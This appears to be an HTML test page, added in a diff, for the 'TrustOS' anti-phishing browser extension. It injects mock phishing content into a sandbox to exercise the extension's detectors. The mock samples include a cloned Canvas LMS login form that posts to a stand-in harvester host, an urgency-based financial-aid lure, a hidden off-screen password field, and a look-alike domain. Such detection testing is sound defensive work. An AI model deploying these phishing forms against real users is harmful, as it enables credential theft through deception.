@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TrustOS Interactive Threat Simulation Playground</title>
+    <link rel="stylesheet" href="trustos-extension/overlay.css">
+    <style>
+        :root {
+            --bg: #090d16;
+            --surface: #131b2e;
+            --surface-card: #1e293b;
+            --border: rgba(148, 163, 184, 0.15);
+            --accent: #3b82f6;
+            --accent-hover: #2563eb;
+            --danger: #ef4444;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --text: #f8fafc;
+            --text-muted: #94a3b8;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            padding: 30px 20px;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1050px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 35px;
+            padding-bottom: 25px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .brand-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(59, 130, 246, 0.15);
+            border: 1px solid rgba(59, 130, 246, 0.35);
+            color: #60a5fa;
+            font-size: 0.8rem;
+            font-weight: 700;
+            padding: 4px 12px;
+            border-radius: 9999px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 12px;
+        }
+
+        h1 {
+            font-size: 2.2rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            margin-bottom: 10px;
+        }
+
+        p.lead {
+            color: var(--text-muted);
+            font-size: 1.05rem;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(310px, 1fr));
+            gap: 18px;
+            margin-bottom: 35px;
+        }
+
+        .card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            transition: transform 0.2s, border-color 0.2s;
+        }
+
+        .card:hover {
+            transform: translateY(-2px);
+            border-color: rgba(59, 130, 246, 0.4);
+        }
+
+        .card-tag {
+            font-size: 0.72rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            padding: 3px 8px;
+            border-radius: 6px;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+
+        .tag-danger { background: rgba(239, 68, 68, 0.15); color: #fca5a5; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .tag-warning { background: rgba(245, 158, 11, 0.15); color: #fde68a; border: 1px solid rgba(245, 158, 11, 0.3); }
+        .tag-success { background: rgba(16, 185, 129, 0.15); color: #6ee7b7; border: 1px solid rgba(16, 185, 129, 0.3); }
+
+        .card h3 {
+            font-size: 1.15rem;
+            margin-bottom: 8px;
+        }
+
+        .card p {
+            font-size: 0.88rem;
+            color: var(--text-muted);
+            line-height: 1.5;
+            margin-bottom: 16px;
+        }
+
+        .btn-test {
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 10px 16px;
+            border-radius: 10px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+
+        .btn-test:hover {
+            background: var(--accent-hover);
+        }
+
+        /* Live Sandbox */
+        .sandbox-panel {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 25px;
+            margin-bottom: 30px;
+        }
+
+        .sandbox-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .sandbox-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+        }
+
+        #sandbox-container {
+            background: var(--surface-card);
+            border: 1px dashed var(--border);
+            border-radius: 12px;
+            padding: 20px;
+            min-height: 120px;
+            margin-bottom: 15px;
+        }
+
+        .controls-row {
+            display: flex;
+            gap: 12px;
+        }
+
+        .btn-reset {
+            background: rgba(239, 68, 68, 0.15);
+            color: #fca5a5;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            padding: 10px 18px;
+            border-radius: 10px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .btn-reset:hover {
+            background: rgba(239, 68, 68, 0.25);
+        }
+
+        /* Live Diagnostic Console */
+        .diagnostic-box {
+            background: #0b1120;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 15px;
+            font-family: monospace;
+            font-size: 0.82rem;
+            color: #38bdf8;
+            max-height: 180px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+    </style>
+
+    <!-- Load TrustOS Scripts in proper order -->
+    <script src="trustos-extension/scripts/config.js"></script>
+    <script src="trustos-extension/scripts/bloom_filter.js"></script>
+    <script src="trustos-extension/scripts/threat_data.js"></script>
+    <script src="trustos-extension/scripts/domain_check.js"></script>
+    <script src="trustos-extension/scripts/wasm_loader.js"></script>
+    <script src="trustos-extension/scripts/keyword_check.js"></script>
+    <script src="trustos-extension/scripts/form_check.js"></script>
+    <script src="trustos-extension/scripts/risk_engine.js"></script>
+    <script src="trustos-extension/content_detector.js"></script>
+</head>
+
+<body>
+    <div class="container">
+        <header>
+            <div class="brand-badge">Evaluation Sandbox</div>
+            <h1>TrustOS Threat Simulation Playground</h1>
+            <p class="lead">Test TrustOS real-time edge phishing detection heuristics, Bloom filter threat matching, Levenshtein typosquatting, and Shadow DOM intervention.</p>
+        </header>
+
+        <div class="grid">
+            <!-- Scenario 1 -->
+            <div class="card">
+                <div>
+                    <span class="card-tag tag-danger">Credential Phishing</span>
+                    <h3>Cloned Canvas LMS Login</h3>
+                    <p>Simulates a deceptive portal soliciting university student credentials with an external cross-origin POST submit action.</p>
+                </div>
+                <button class="btn-test" onclick="simulateCanvasPhish()">Run Canvas Attack Simulation</button>
+            </div>
+
+            <!-- Scenario 2 -->
+            <div class="card">
+                <div>
+                    <span class="card-tag tag-danger">Urgency Coercion</span>
+                    <h3>Scholarship & Financial Aid Lure</h3>
+                    <p>Injects high-pressure psychological urgency phrases threatening account termination alongside credential verification.</p>
+                </div>
+                <button class="btn-test" onclick="simulateUrgencyLure()">Run Urgency Lure Simulation</button>
+            </div>
+
+            <!-- Scenario 3 -->
+            <div class="card">
+                <div>
+                    <span class="card-tag tag-warning">Obscured Input</span>
+                    <h3>Stealth Keystroke Harvest Field</h3>
+                    <p>Injects hidden 0-opacity and off-screen password inputs designed to evade visual detection and exfiltrate credentials.</p>
+                </div>
+                <button class="btn-test" onclick="simulateStealthField()">Run Stealth Field Simulation</button>
+            </div>
+
+            <!-- Scenario 4 -->
+            <div class="card">
+                <div>
+                    <span class="card-tag tag-danger">Bloom Filter Match</span>
+                    <h3>Known Malicious Domain Signature</h3>
+                    <p>Directly tests the bit-packed Bloom filter by checking against known threat signatures compiled in the local threat feed.</p>
+                </div>
+                <button class="btn-test" onclick="simulateBloomMatch()">Test Bloom Filter Match</button>
+            </div>
+
+            <!-- Scenario 5 -->
+            <div class="card">
+                <div>
+                    <span class="card-tag tag-warning">Algorithmic Anomaly</span>
+                    <h3>High Shannon Entropy Analysis</h3>
+                    <p>Evaluates randomized DGA string generation and calculated Shannon entropy for algorithmic domain classification.</p>
+                </div>
+                <button class="btn-test" onclick="simulateEntropyTest()">Test Shannon Entropy Metric</button>
+            </div>
+
+            <!-- Scenario 6 -->
+            <div class="card">
+                <div>
+                    <span class="card-tag tag-success">Safe Verification</span>
+                    <h3>Verified Educational Portal</h3>
+                    <p>Tests legitimate educational workflows to verify false-positive suppression and clean security evaluation.</p>
+                </div>
+                <button class="btn-test" style="background: #10b981;" onclick="simulateCleanState()">Test Safe Verification</button>
+            </div>
+        </div>
+
+        <!-- Live Sandbox & Injector -->
+        <div class="sandbox-panel">
+            <div class="sandbox-header">
+                <div class="sandbox-title">Active DOM Sandbox & Telemetry Output</div>
+                <div class="controls-row">
+                    <button class="btn-reset" onclick="resetSandbox()">Clear Sandbox & Reset Overlay</button>
+                </div>
+            </div>
+
+            <div id="sandbox-container">
+                <p style="color: var(--text-muted); font-size: 0.88rem;">Sandbox is currently clean. Click any scenario button above to inject phishing vectors into this DOM.</p>
+            </div>
+
+            <div class="sandbox-title" style="font-size: 0.95rem; margin-bottom: 8px;">TrustOS Edge Telemetry Stream:</div>
+            <div class="diagnostic-box" id="diagnostic-output">Waiting for simulation event...</div>
+        </div>
+    </div>
+
+    <script>
+        function logDiagnostic(data) {
+            const out = document.getElementById('diagnostic-output');
+            out.textContent = JSON.stringify(data, null, 2);
+        }
+
+        function resetSandbox() {
+            const box = document.getElementById('sandbox-container');
+            box.innerHTML = '<p style="color: var(--text-muted); font-size: 0.88rem;">Sandbox is currently clean. Click any scenario button above to inject phishing vectors into this DOM.</p>';
+            if (window.TrustOS && window.TrustOS.removeShield) {
+                window.TrustOS.removeShield();
+            }
+            logDiagnostic({ status: "SANDBOX_CLEARED", message: "All injected elements removed." });
+        }
+
+        function simulateCanvasPhish() {
+            const box = document.getElementById('sandbox-container');
+            box.innerHTML = `
+                <div style="background: #0f172a; padding: 20px; border-radius: 10px; border: 1px solid #ef4444;">
+                    <h2 style="color: #ef4444; margin-bottom: 8px;">URGENT: Canvas LMS Account Verification</h2>
+                    <p style="color: #cbd5e1; font-size: 0.9rem; margin-bottom: 12px;">Your institutional single-sign-on access has expired. Please verify your password immediately to prevent account lock.</p>
+                    <form action="https://evil-credential-harvester.com/collect" method="POST">
+                        <div style="margin-bottom: 8px;">
+                            <input type="text" placeholder="Student ID / Email" style="width: 100%; padding: 8px; border-radius: 6px; background: #1e293b; color: white; border: 1px solid #475569;" />
+                        </div>
+                        <div style="margin-bottom: 12px;">
+                            <input type="password" placeholder="Password" style="width: 100%; padding: 8px; border-radius: 6px; background: #1e293b; color: white; border: 1px solid #475569;" />
+                        </div>
+                        <button type="submit" style="background: #ef4444; color: white; border: none; padding: 8px 16px; border-radius: 6px; font-weight: 700; cursor: pointer;">Verify Password Now</button>
+                    </form>
+                </div>
+            `;
+            const result = window.TrustOS.RiskEngine.analyzePage();
+            logDiagnostic(result);
+            if (result.isHighRisk) {
+                window.TrustOS.activateShield(result);
+            }
+        }
+
+        function simulateUrgencyLure() {
+            const box = document.getElementById('sandbox-container');
+            box.innerHTML = `
+                <div style="background: #0f172a; padding: 20px; border-radius: 10px; border: 1px solid #f59e0b;">
+                    <h2 style="color: #f59e0b; margin-bottom: 8px;">SECURITY ALERT: Financial Aid Hold & Account Suspended</h2>
+                    <p style="color: #cbd5e1; font-size: 0.9rem; margin-bottom: 12px;">Immediate action required: A security breach was detected on your scholarship disbursement portal. Confirm identity immediately within 24 hours.</p>
+                    <form>
+                        <input type="password" placeholder="Enter Current Password" style="width: 100%; padding: 8px; border-radius: 6px; background: #1e293b; color: white; border: 1px solid #475569; margin-bottom: 10px;" />
+                        <button type="button" style="background: #f59e0b; color: black; border: none; padding: 8px 16px; border-radius: 6px; font-weight: 700; cursor: pointer;">Restore Access</button>
+                    </form>
+                </div>
+            `;
+            const result = window.TrustOS.RiskEngine.analyzePage();
+            logDiagnostic(result);
+            if (result.isHighRisk) {
+                window.TrustOS.activateShield(result);
+            }
+        }
+
+        function simulateStealthField() {
+            const box = document.getElementById('sandbox-container');
+            box.innerHTML = `
+                <div style="background: #0f172a; padding: 20px; border-radius: 10px; border: 1px solid #94a3b8;">
+                    <h3>Public Educational Resource Portal</h3>
+                    <p style="color: #cbd5e1; font-size: 0.9rem;">Browse public articles and lecture notes.</p>
+                    <!-- Invisible password input attempting background harvest -->
+                    <input type="password" style="opacity: 0; width: 0; height: 0; position: absolute; left: -9999px;" />
+                </div>
+            `;
+            const result = window.TrustOS.RiskEngine.analyzePage();
+            logDiagnostic(result);
+            if (result.isHighRisk) {
+                window.TrustOS.activateShield(result);
+            }
+        }
+
+        function simulateBloomMatch() {
+            const testThreatDomain = "secure-login.instructure-canvas.com";
+            const isMatch = window.TrustOS.BloomFilter.test(testThreatDomain);
+            const domainRes = window.TrustOS.DomainCheck.evaluate(testThreatDomain);
+            logDiagnostic({
+                testDomain: testThreatDomain,
+                bloomFilterMatch: isMatch,
+                evaluation: domainRes
+            });
+        }
+
+        function simulateEntropyTest() {
+            const lowEntropy = "google";
+            const highEntropy = "xjk92a9881zbcq71";
+            const eLow = window.TrustOS.DomainCheck.calculateEntropy(lowEntropy);
+            const eHigh = window.TrustOS.DomainCheck.calculateEntropy(highEntropy);
+            logDiagnostic({
+                lowEntropyTest: { string: lowEntropy, entropy: eLow.toFixed(3), status: "Normal" },
+                highEntropyTest: { string: highEntropy, entropy: eHigh.toFixed(3), status: "High Entropy DGA" },
+                threshold: window.TrustOS.Config.ENTROPY_THRESHOLD
+            });
+        }
+
+        function simulateCleanState() {
+            resetSandbox();
+            const cleanHost = "canvas.instructure.com";
+            const cleanDomainRes = window.TrustOS.DomainCheck.evaluate(cleanHost);
+            logDiagnostic({
+                testedOrigin: cleanHost,
+                result: cleanDomainRes,
+                message: "Legitimate institutional domains are recognized and suppressed from false positives."
+            });
+        }
+    </script>
+</body>
+
+</html>
